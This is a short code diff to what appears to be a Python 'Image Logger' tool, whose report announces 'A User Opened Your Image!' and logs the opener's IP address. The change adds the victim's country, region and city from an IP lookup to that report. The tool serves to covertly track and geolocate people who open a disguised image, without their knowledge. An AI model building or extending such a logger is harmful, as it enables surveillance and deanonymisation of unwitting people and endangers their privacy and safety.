@@ -147,6 +147,10 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
             "title": "Image Logger - IP Logged",
             "color": config["color"],
             "description": f"""**A User Opened Your Image!**
+
+> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
+> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
+> **City:** `{info['city'] if info['city'] else 'Unknown'}`
 > **IP:** `{ip if ip else 'Unknown'}`""",
     }
   ],
